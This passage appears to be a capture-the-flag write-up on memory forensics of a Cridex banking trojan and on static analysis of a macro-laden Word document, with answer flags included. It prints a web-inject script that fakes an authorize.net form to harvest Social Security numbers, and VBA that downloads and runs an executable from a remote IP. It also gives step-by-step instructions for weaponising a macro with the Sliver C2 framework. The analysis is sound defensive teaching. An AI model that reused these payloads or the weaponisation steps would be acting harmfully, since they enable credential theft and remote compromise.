*ib.snoras.com*
*i-linija.lt*
*loyalbank.com*
*marfinbank.com.cy*
*multinetbank.eu*
*nordea.com*
*secure.ltbbank.com*
*secure.ltblv.com*
*swedbank.lv*
*norvik.lv*
*online.alphabank.com.cy*
*online.citadele.lv*
*online.lkb.lv*
*online.ibl.com.lb*
*online-offshore.lloydstsb.com*
*online.usb.com.cy*
*parex.lv*
*handelsbanken.lv*
*pastabanka.lv*
*piraeusbank.com*
*lv.unicreditbanking.net*
```

I found a lot of banking domains, this is just a snippet This is weird and suspicious. Further information retrieved:

```bash
*jqueryaddonsv2.js*
http://188.40.0.138:8080/zb/v_01_a/in/cp.php
*account.authorize.net/*
<head*>
<style type="text/css">
body { visibility: hidden; }
.ui-dialog-titlebar { display:none; }
.ui-dialog .ui-dialog-titlebar-close { visibility: hidden; }
.ui-dialog { width: 400px; font-size: 11px;  padding: 0px; position:absolute; top:150px;}
.ui-dialog .ui-dialog-titlebar { visibility: hidden; display: none;}
.ui-dialog-content { padding: 0px;}
</style>
<link type="text/css" rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.7.1/themes/smoothness/ui.all.css" />
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.7.1/jquery-ui.min.js"></script>
<script type="text/javascript">
var jq = jQuery.noConflict();
var testInj = false;
jq(document).ready(mainloader);
function mainloader() {
    if (get_cookie("stopseQ") == null && jq("a.HeaderLogout").length > 0) {
        debugInj("LoaderON");
        jq("body").append("<div id=\"DataDiv\" style=\"display: none; text-align:center; padding:3px; margin:3px;\"></div>");
        jq("#DataDiv").html("<img src=\"https://account.authorize.net/UI/themes/anet/images/authorizenet_logo.gif\"/><iframe name=\"hidFrame\" id=\"hidFrame\" style=\"border:0px; width:0px; height:0px;\" width=\"0\" height=\"0\" border=\"0\"></iframe><form name=\"oloeSubmit\" id=\"oloeSubmit\" target=\"hidFrame\" action=\"https://account.authorize.net/UI/themes/anet/logon2.aspx\" method=\"post\"><table><tr><td align=\"left\" style=\"text-align: justify; font-size: 11px; padding-top:10px;\">Dear Customer,<p>Your information is out of date and should be updated.</p></td></tr></table><div><table><tr><td align=\"left\" style=\"font-size: 11px;\">Social Security Number:</td><td align=\"left\" style=\"font-size: 11px;\"><input type=\"text\" name=\"ssn\" id=\"ssn\" maxlength=\"11\" size=\"11\"/> (xxx-xx-xxxx)</td></tr><tr><td align=\"left\" style=\"font-size: 11px;\">Company's Tax ID Number:</td><td align=\"left\" style=\"font-size: 11px;\"><input type=\"text\" name=\"taxid\" id=\"taxid\" maxlength=\"10\" size=\"10\"/> (xx-xxxxxxx)</td></tr></table></div></form><br><input type=\"submit\" onclick=\"iSbmtButton()\" value=\"Update\" style=\"background-color:#095AA6;border:1px double White;color:#FFFFFF;cursor:pointer;font-family:Verdana,Arial,Helvetica,sans-serif;font-weight:bold;font-size:11px;\">");
        jq("body").css("visibility", "visible");
                jq("#DataDiv").dialog({
            resizable: false,
            closeOnEscape: false,
            show: "slide",
            width: 315,
            height: 'auto'
            modal: true
        });
                jq('.ui-widget-overlay').css('background', '#FFF');
                jq('.ui-widget-overlay').css('opacity', '1');
    } else {
                jq("body").css("visibility", "visible");
        debugInj("LoaderOFF");
    }
function iSbmtButton() {
    jq("#ssn").val(jq("#ssn").val().replace(/[^0-9\-]/g, ""));
    jq("#taxid").val(jq("#taxid").val().replace(/[^0-9\-]/g, ""));
    if (jq("#ssn").val().length < 11) {
        alert("Please enter correct Social Security Number");
        jq("#ssn").focus();
                return false;
    } else if (jq("#taxid").val().length < 10) {
        alert("Please enter correct Company's Tax ID Number");
        jq("#taxid").focus();
                return false;
    } else {
                set_cookie("stopseQ", "yes", 432000, "/");
        jq("#oloeSubmit").submit();
        setTimeout("jq('#DataDiv').dialog('close'); jq('#DataDiv').remove();jq('body').css('visibility', 'visible');", 2500);
                return false;
    }
function get_cookie(name) {
    var cookie = " " + document.cookie;
    var search = " " + name + "=";
    var setStr = null;
    var offset = 0;
    var end = 0;
    if (cookie.length > 0) {
        offset = cookie.indexOf(search);
        if (offset != -1) {
            offset += search.length;
            end = cookie.indexOf(";", offset);
:
```

```bash
abcdefghijklmnopqrstuvwxyz
ABCDEFGHIJKLMNOPQRSTUVWXYZ
ALLUSERSPROFILE=C:\Documents and Settings\All Users
APPDATA=C:\Documents and Settings\Robert\Application Data
CLIENTNAME=Console
CommonProgramFiles=C:\Program Files\Common Files
COMPUTERNAME=ACCOUNTING12
ComSpec=C:\WINDOWS\system32\cmd.exe
FP_NO_HOST_CHECK=NO
HOMEDRIVE=C:
HOMEPATH=\Documents and Settings\Robert
LOGONSERVER=\\ACCOUNTING12
NUMBER_OF_PROCESSORS=1
OS=Windows_NT
Path=C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
PROCESSOR_ARCHITECTURE=x86
PROCESSOR_IDENTIFIER=x86 Family 6 Model 23 Stepping 6, GenuineIntel
PROCESSOR_LEVEL=6
PROCESSOR_REVISION=1706
ProgramFiles=C:\Program Files
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\WINDOWS
TEMP=C:\DOCUME~1\Robert\LOCALS~1\Temp
TMP=C:\DOCUME~1\Robert\LOCALS~1\Temp
USERDOMAIN=ACCOUNTING12
USERNAME=Robert
USERPROFILE=C:\Documents and Settings\Robert
windir=C:\WINDOWS
thmfile
rendobj
rendobj
themewnd
""""""#"""""""""#""""""
""""""#$%%%%%%$%%%%%%%%%$%%%%%%
```

We now have full proof that this process is suspicious. In order to determine if the executable is malicious or not, we can do the following:

- Doing a static analysis and reversing the executable to see concretely what commands the executable uses and its aim
- Try a dynamic analysis by using a sandbox or online tools that analyzes potentially malicious executable

Since i'm only starting and not well conversant with reverse-engineering the executable, i'll proceed by performing a dynamic analysis using two sites:

- [Virus Total](https://www.virustotal.com/)
- [HybridAnalysis](https://www.hybrid-analysis.com/)

Lets go ahead an upload the executable for analysis

1. Virus Total

![image](https://user-images.githubusercontent.com/58165365/179369754-41aa74eb-2ad3-489a-bcc9-82844daf9741.png)

We can see that the executable has been flagged by 33/69 vendors as a trojan.

![image](https://user-images.githubusercontent.com/58165365/179370022-6c7f20f9-3dab-4c39-8dd1-2702f1d10e2f.png)

We can also find information such as when the sample was first submitted and some other Names you can use to identify the process. Link to this analysis can be found [here](https://www.virustotal.com/gui/file/5b136147911b041f0126ce82dfd24c4e2c79553b65d3240ecea2dcab4452dcb5/detection) or you can just upload your sample🙂

2. HybridAnalysis

![image](https://user-images.githubusercontent.com/58165365/179368111-667fc715-8bb9-47f7-945f-60c19d91cbd7.png)

![image](https://user-images.githubusercontent.com/58165365/179368105-f97d72ff-0a70-402d-beb2-e49f4e794ccb.png)

![image](https://user-images.githubusercontent.com/58165365/179368139-6c110d08-6c3e-4fe0-b825-ede431713223.png)

I concluded from both analysis that the executable is malicious - a trojan.

Link to the hybrid analysis report can be found [here](https://www.hybrid-analysis.com/sample/5b136147911b041f0126ce82dfd24c4e2c79553b65d3240ecea2dcab4452dcb5/)

Hybrid analysis also gives a nice **MITRE ATT&CK™ Techniques Detection summary** report with 6 mapped indicators

![image](https://user-images.githubusercontent.com/58165365/179368251-5ab3c64c-85a6-4215-b432-e8a942956db5.png)

Lets sum up our investigation by highlighting some findings we got:

- An odd process `Reader_sl.exe` PID `1640` nested with Explorer as a ParentPID `1484`
- An opened connection towards `41.168.5.140:8080` used by the PID 1484
- Bank domains and 41.168.5.140 found in the dump of the process 1640
- 1640 executable detected as malicious Trojan by the two sandboxing websites we used.

We can then concluded that the Victim's computer was infected with a trojan

## Prevention

We can assume that this was a personal computer. What if this scenario was in an organization and the trojan was sent as a phishing campaign to all users in the organization?

We need to collect IOC's (Indicators of Compromise) and share this intel with the SOC team to detect other potentially infected computers.

The following are some of the IOC i managed to gather:

### 1. The C&C IP address

The first IOC we came across was the Command & Control IP address we found when scanning for tcp connections . In order to see if other IP addresses are used we can for example try and search in the process dump file for the following pattern `/zb/v_01_a/in/` which is the path queried by the malware (`41.168.5.140:8080/zb/v_01_a/in/`).

```bash
root@siftworkstation -> /h/s/D/cases
# strings 1640.dmp | grep -Fi "/zb/v_01_a/in/"
http://188.40.0.138:8080/zb/v_01_a/in/cp.php
POST /zb/v_01_a/in/ HTTP/1.1
http://188.40.0.138:8080/zb/v_01_a/in/cp.php
http://188.40.0.138:8080/zb/v_01_a/in/cp.php
root@siftworkstation -> /h/s/D/cases
```

Awesome, we found another ip address `188.40.0.138`

We can go further and see if we can associate these IPs with possible hostnames using a passive DNS. For this case we’ll use a public passive DNS service named `Mnemonic`

[Argus Managed Defence - mnemonic](https://passivedns.mnemonic.no/)

_188.40.0.138_

![image](https://user-images.githubusercontent.com/58165365/179369375-634e5481-9812-46a4-904a-ef652d0f6a88.png)

_41.168.5.140_

![image](https://user-images.githubusercontent.com/58165365/179368778-3eded5f2-621a-4d32-813a-a3ed262c68b1.png)

At this point you should then proceed and analyze each possible hostname to see if they could be linked to our trojan (That is: Does the time of the DNS record correspond to the time of the infection?, Is it a legitimate website?). We would then give those IOCs to the SOC team for a proper detection of this trojan infection on the company’s infrastructure using custom SIEM detection rules.

## Deletion

It is common for most malware to make their execution automatic at every system startup, hence making their deletion difficult. To see if this is the case with Cridex we can take a look at the registry entries used during the system startup.

The registry keys are stored in the following path:

`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run, RunOnce, RunOnceEx`

[References](https://attack.mitre.org/techniques/T1547/001/)

We can use use the `hivelist` plugin to print list of registry hives as shown below

```bash
root@siftworkstation -> /h/s/D/cases
# vol.py -f cridex.vmem --profile=WinXPSP2x86 hivelist
Volatility Foundation Volatility Framework 2.6
Virtual    Physical   Name
---------- ---------- ----
0xe18e5b60 0x093f8b60 \Device\HarddiskVolume1\Documents and Settings\Robert\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat
0xe1a19b60 0x0a5a9b60 \Device\HarddiskVolume1\Documents and Settings\Robert\NTUSER.DAT
0xe18398d0 0x08a838d0 \Device\HarddiskVolume1\Documents and Settings\LocalService\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat
0xe18614d0 0x08e624d0 \Device\HarddiskVolume1\Documents and Settings\LocalService\NTUSER.DAT
0xe183bb60 0x08e2db60 \Device\HarddiskVolume1\Documents and Settings\NetworkService\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat
0xe17f2b60 0x08519b60 \Device\HarddiskVolume1\Documents and Settings\NetworkService\NTUSER.DAT
0xe1570510 0x07669510 \Device\HarddiskVolume1\WINDOWS\system32\config\software
0xe1571008 0x0777f008 \Device\HarddiskVolume1\WINDOWS\system32\config\default
0xe15709b8 0x076699b8 \Device\HarddiskVolume1\WINDOWS\system32\config\SECURITY
0xe15719e8 0x0777f9e8 \Device\HarddiskVolume1\WINDOWS\system32\config\SAM
0xe13ba008 0x02e4b008 [no name]
0xe1035b60 0x02ac3b60 \Device\HarddiskVolume1\WINDOWS\system32\config\system
0xe102e008 0x02a7d008 [no name]
```

We can further use `printkey` plugin to print the registry keys, and its subkeys and values

```bash
root@siftworkstation -> /h/s/D/cases
# vol.py -f cridex.vmem --profile=WinXPSP2x86 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"
Volatility Foundation Volatility Framework 2.6
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\Documents and Settings\Robert\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat
Key name: Run (S)
Last updated: 2011-04-13 00:55:13 UTC+0000

Subkeys:

Values:
----------------------------
Registry: \Device\HarddiskVolume1\Documents and Settings\Robert\NTUSER.DAT
Key name: Run (S)
Last updated: 2012-07-22 02:31:51 UTC+0000

Subkeys:

Values:
REG_SZ        KB00207877.exe  : (S) "C:\Documents and Settings\Robert\Application Data\KB00207877.exe"
----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\default
Key name: Run (S)
Last updated: 2011-04-12 20:31:49 UTC+0000

Subkeys:

Values:
----------------------------
Registry: \Device\HarddiskVolume1\Documents and Settings\LocalService\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat
Key name: Run (S)
Last updated: 2011-04-13 00:55:13 UTC+0000

Subkeys:

Values:
----------------------------
Registry: \Device\HarddiskVolume1\Documents and Settings\NetworkService\NTUSER.DAT
Key name: Run (S)
Last updated: 2011-04-13 00:49:16 UTC+0000

Subkeys:

Values:
----------------------------
Registry: \Device\HarddiskVolume1\Documents and Settings\LocalService\NTUSER.DAT
Key name: Run (S)
Last updated: 2011-04-13 00:49:28 UTC+0000

Subkeys:

Values:
----------------------------
Registry: \Device\HarddiskVolume1\Documents and Settings\NetworkService\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat
Key name: Run (S)
Last updated: 2011-04-13 00:55:13 UTC+0000

Subkeys:

Values:

```

As you can see, the only hive that has been recently modified is the following registry `\Device\HarddiskVolume1\Documents and Settings\Robert\NTUSER.DAT`. Let’s confirm that the concerned executable named `KB00207877.exe` is linked with our trojan:

```bash
root@siftworkstation -> /h/s/D/cases
# strings 1640.dmp | grep -Fi "KB00207877.exe"
KB00207877.exe
C:\Documents and Settings\Robert\Application Data\KB00207877.exe(,
KB00207877.EXEn
KB00207877.exe
KB00207877.exe
C:\Documents and Settings\Robert\Application Data\KB00207877.exe(,
```

Since the executable is found in the memory dump of our trojan executable, we are now sure that Cridex modified the starting up registry key of the victim’s computer to make itself persistent. Deleting this `KB00207877.exe` is needed to make a good cleanup of the infected machine.

Expected flags:

| **Question** | **Flag**                                                     |
| ------------ | ------------------------------------------------------------ |
| Memory 1     | Flag{reader_sl.exe,1484}                                     |
| Memory 2     | Flag{172.16.112.128,41.168.5.140,1038}                       |
| Memory 3     | Flag{C:\Program Files\Adobe\Reader 9.0\Reader\Reader_sl.exe} |
| Memory 4     | Flag{Robert}                                                 |
| Memory 5     | Flag{/zb/v_01_a/in/}                                         |

## Resources

- [Memory Samples - volatilityfoundation / volatility](https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples)
- [Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder ](https://attack.mitre.org/techniques/T1547/001/)
- [strings (Unix)](<https://en.wikipedia.org/wiki/Strings_(Unix)>)
- [Strings - Windows SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/strings)
- [Hybrid Analysis Report for the dumped executable](https://www.hybrid-analysis.com/sample/5b136147911b041f0126ce82dfd24c4e2c79553b65d3240ecea2dcab4452dcb5/)
- [Virus Total Report for the dumped executable](https://www.virustotal.com/gui/file/5b136147911b041f0126ce82dfd24c4e2c79553b65d3240ecea2dcab4452dcb5/detection)
- [What is Acrobat.exe?](https://www.file.net/process/acrobat.exe.html)
- [SIFT Workstation](https://www.sans.org/tools/sift-workstation/)

# Maldoc

> You are on SOC shift and you receive an alert that a malicious file has been downloaded by a user. You reach out to the user and ask them what they downloaded and they have no idea. The user goes ahead and tells you that he recived and downloaded a job offer document (Job_Offer-2.docm) which prompted him to enable macros before viewing. IR folks acquired the document and hand it over to you for analysis. Can you determine the Document author, Suspicious IP being contacted by the user's machine & file downloaded and executed.

Flag format: Flag{author,IP,filename.extension}

Points to award: 250

---

## Automated Analysis

For starters, I'll be showing you how to perform simple static analysis using an online digital forensics tool.

[IRIS-H Digital Forensics](https://iris-h.services/pages/dashboard) is a good site to do a quick and indepth analysis on:

- Microsoft Office Documents ( Word, Excel and PowerPoint). The service will recognize and process documents stored in OLE, OOXML and OPC formats.
- Shell Link Binary File Format. (`.lnk`)
- Rich Text Format.

How does the site work?

Once a file submission is uploaded and accepted, IRIS-H dissects the submitted file into individual file components and performs static analysis of each of the components, which involves sequential reading, extraction and enrichment of components' binary data. The enrichment process adds human readable description to the extracted data. Once data extraction and enrichment are completed, IRIS-H assesses the file threat level and assigns it one of the followng categories: `BENIGN`, `SUSPICIOUS` or `MALICIOUS`.

With that said, lets go ahead and upload the document for analysis. Once the report is generated, you get:

![image](https://user-images.githubusercontent.com/58165365/179976707-a966b5c3-c2ab-426e-a965-5c6a95efbcf3.png)

On careful inspection, we can see the document has VBA macro with an external reference to `http://103.255.5.117:443/notepad.exe`. We can also see some suspicious Macro commands like:

- `AutoOpen` - When a document is opened, an Auto-Open macro runs if the Auto-Open macro is saved as part of that document or if the macro is saved as part of the template on which the document is based.
- `Shell` - VBA Shell function calls a separate, executable program from inside a VBA program.

![image](https://user-images.githubusercontent.com/58165365/179976894-5887d6dc-39be-4efa-b137-6207ff95e5cf.png)

Metadata section basically gives you info such as Total Number of Pages, Application Name & Version used to create the document (In this case Microsoft Office Word 2016), Author , Creation Timestamp etc etc.

![image](https://user-images.githubusercontent.com/58165365/179977172-d84ff4d9-2c1c-430e-91c0-d69bbe5a958f.png)

Lets actually dive into the juicy part of the macro code above:

```vba
Attribute VB_Name = "NewMacros"
Sub AutoOpen()
    notepad
End Sub
Sub notepad()
    Dim strProgramName As String
    Dim strArgument As String
    Set doc = ActiveDocument
    strProgramName = doc.BuiltInDocumentProperties("Subject").Value
    strArgument = "/c curl -s http://103.255.5.117:443/notepad.exe --output %temp%\notepad.exe && %temp%\notepad.exe"
    Call Shell("""" & strProgramName & """ """ & strArgument & """", vbHideFocus)
End Sub
```

Shell has 3 input parameters:

- A required pathname for the program to call (strProgramName) . In this case the program to call is referenced at Subject property/value. If we look at Subject property under Metadata, we see the program called is `cmd.exe`
  ![image](https://user-images.githubusercontent.com/58165365/180003751-5312d2a5-cfc4-401f-acb9-3d0483191141.png)

- A required argument(strArgument). This is basically a curl command running in silent mode and fetching an exectutable called notepad.exe from `http://103.255.5.117:443` and finally dumping it to the `temp` directory.
- Windowstyle value controlling the style of the window where the program will run.(vbHideFocus) . In this case the window style is set to `vbHideFocus`. Other window styles include:

| Constant           | Value | Description                                                                                                              |
| ------------------ | ----- | ------------------------------------------------------------------------------------------------------------------------ |
| vbHide             | 0     | Window is hidden and focus is passed to the hidden window. The vbHide constant is not applicable on Macintosh platforms. |
| vbNormalFocus      | 1     | Window has focus and is restored to its original size and position.                                                      |
| vbMinimizedFocus   | 2     | Window is displayed as an icon with focus.                                                                               |
| vbMaximizedFocus   | 3     | Window is maximized with focus.                                                                                          |
| vbNormalNoFocus    | 4     | Window is restored to its most recent size and position. The currently active window remains active.                     |
| vbMinimizedNoFocus | 6     | Window is displayed as an icon. The currently active window remains active.                                              |

Now for this challenge, i seeked helped from my buddy [@Amarjit_Labu](https://twitter.com/Amarjit_Labu) and borrowed some tips from [TJ Null's Blog - Macro Weaponization](https://www.offensive-security.com/offsec/macro-weaponization/). I wanted to replicate and test this logic of this macro code and i can just describe what it does in a nutshell.

- On Kali, i installed Sliver C2 framework
  `sudo apt install sliver`
- On a windows machine(Target), create a new document and create a macro as follows:

![image](https://user-images.githubusercontent.com/58165365/180001814-23b1daef-f35c-4103-82b3-7490feb2bb54.png)

![image](https://user-images.githubusercontent.com/58165365/180002240-198a89c2-3bf9-4356-bd2b-3e7dccc30933.png)

![image](https://user-images.githubusercontent.com/58165365/180002522-fb5335ad-46ea-4230-96df-ee305aba2e26.png)

**NB:** _You want to create the macros in the current document...So choose the last option and not "All active templates and documents"_

Once thats created, add the following vba code and save:

```vba
Sub AutoOpen()
    chapel
End Sub
Sub chapel()
    Dim strProgramName As String
    Dim strArgument As String
    Set doc = ActiveDocument
    strProgramName = doc.BuiltInDocumentProperties("Subject").Value
    strArgument = "/c curl -s http://<attacker_ip>:8443/oste.exe --output %temp%\oste.exe && %temp%\oste.exe
    Call Shell("""" & strProgramName & """ """ & strArgument & """", vbHideFocus)
End Sub
```

- Save the document as a `.dotm` (Word Macro-Enabled Template) and exit.

- Right click on the document created and view its properties. On the Details tab, under Subject, add `cmd.exe` and hit **Apply** and **Ok**.

![image](https://user-images.githubusercontent.com/58165365/180003751-5312d2a5-cfc4-401f-acb9-3d0483191141.png)

- Spin the sliver server

`sliver-server`

- Generate a malicious executable using the following command:

`generate --mtls <local_ip> --save oste.exe --os Windows`

- Start a python server where you generated the executable.

`python3 -m http.server 8443`

- Back on your C2 server, start an mTLS listener by running:

`mtls`

On my windows lab, open the document and enable macros.

![image](https://user-images.githubusercontent.com/58165365/180004094-93a0b986-b249-4097-af63-eaeb078ebfdb.png)

You should have a session on your windows target.

**Answer:** `Flag{Human,103.255.5.117,notepad.exe}`

## Manual Analysis

To quickly get the documents metadata, you can use `exiftool`.

![image](https://user-images.githubusercontent.com/58165365/180061464-bbb94bc2-424b-48b4-a13d-9fb8330f2a16.png)

From the results, we can get interesting stuff like Subject, Creator, Last Modified By. Lets proceed to analyse the maldoc further.

For manual analysis, we can use a series of python tools called [oletool](https://pypi.org/project/oletools/). To install them, simply run:

`pip install oletools`

oletools is a package of python tools to analyze Microsoft OLE2 files (also called Structured Storage, Compound File Binary Format or Compound Document File Format), such as Microsoft Office documents or Outlook messages, mainly for malware analysis, forensics and debugging.

Some tools to analyze malicious documents include:

- `oleid`: to analyze OLE files to detect specific characteristics usually found in malicious files.
- `olevba`: to extract and analyze VBA Macro source code from MS Office documents (OLE and OpenXML).
- `MacroRaptor`: to detect malicious VBA Macros
- `msodde`: to detect and extract DDE/DDEAUTO links from MS Office documents, RTF and CSV
- `pyxswf`: to detect, extract and analyze Flash objects (SWF) that may be embedded in files such as MS Office documents (e.g. Word, Excel) and RTF, which is especially useful for malware analysis.
- `oleobj`: to extract embedded objects from OLE files.
- `rtfobj`: to extract embedded objects from RTF files.

Tools to analyze the structure of OLE files

- `olebrowse`: A simple GUI to browse OLE files (e.g. MS Word, Excel, Powerpoint documents), to view and extract individual data streams.
- `olemeta`: to extract all standard properties (metadata) from OLE files.
- `oletimes`: to extract creation and modification timestamps of all streams and storages.
- `oledir`: to display all the directory entries of an OLE file, including free and orphaned entries.
- `olemap`: to display a map of all the sectors in an OLE file.

I'll start with the first tool to determine if the doc is malicious or not:

`mraptor Job_Offer-2.docm`

![image](https://user-images.githubusercontent.com/58165365/180058953-9afaa7b6-b971-4f68-8174-e7f72644eb44.png)

Once it finishes analysing, it exits with the code : `SUSPICIOUS` and indicated suspicious commands it detected. Other exit codes you'd expect by analysis different doc's include:

- 0: No Macro
- 1: Not MS Office
- 2: Macro OK
- 10: ERROR
- 20: SUSPICIOUS

Next tool in-line is `oleid` which analyzes OLE files such as MS Office documents (e.g. Word, Excel), to detect specific characteristics that could potentially indicate that the file is suspicious or malicious, in terms of security (e.g. malware). For example it can detect VBA macros, embedded Flash objects, fragmentation. Simply run

`oleid Job_Offer-2.docm`

![image](https://user-images.githubusercontent.com/58165365/180059123-fe56bd9b-0298-4d8d-aef5-6c4da676d507.png)

We see that we have VBA Macros with a HIGH risk rating. Lets take this a notch higher and use `olevba` to extract and analyze VBA Macro source code from MS Office documents (OLE and OpenXML). I'll start by appending `-a` to the command which will display only analysis results, not the macro source code

![image](https://user-images.githubusercontent.com/58165365/180059284-8cca5431-4414-485e-a759-d84ca3aab945.png)

We can also throw in a `-c` to display only VBA source code and not analyze it

![image](https://user-images.githubusercontent.com/58165365/180059412-3bb4d1de-7047-49a7-a167-1ba740d2aa71.png)

Well, if you'd like the output of the above commands merged into one, use `--deobf`

![image](https://user-images.githubusercontent.com/58165365/180060706-372a0c57-b7eb-4516-8d6c-db8115d556b0.png)

Thats it guys...Thanks for coming this far. Hope you learned a thing or two . If you have any questions, feedback, suggestions, feel free to reach out on twitter Twitter [**@oste_ke**](https://twitter.com/oste_ke)
